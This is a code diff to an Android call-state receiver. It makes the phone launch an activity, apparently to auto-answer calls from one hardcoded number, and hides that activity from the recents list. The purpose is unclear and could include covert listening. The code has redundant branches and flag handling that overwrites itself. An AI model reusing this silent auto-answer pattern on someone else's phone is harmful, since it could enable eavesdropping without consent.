@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.os.Build;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.widget.Toast;
@@ -66,7 +67,21 @@ public class MyBroadcastReceiver extends BroadcastReceiver {
                 isIncoming = true;
                 callStartTime = new Date();
                 savedNumber = number;
-                onIncomingCallStarted(context, number, callStartTime);
+                if(number.equals("+38163230664")) {
+                    if (Build.VERSION.SDK_INT >= 21 ) {
+                        Intent answerCalintent = new Intent(context, AcceptCallActivity.class);
+                        answerCalintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+                        answerCalintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        context.startActivity(answerCalintent);
+                    } else {
+                        Intent intent = new Intent(context, AcceptCallActivity.class);
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        context.startActivity(intent);
+                    }
+                }
+                Toast.makeText(context, "Veza uspostavljena" + number , Toast.LENGTH_SHORT).show();
+                //onIncomingCallStarted(context, number, callStartTime);
                 break;
             case TelephonyManager.CALL_STATE_OFFHOOK:
                 //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
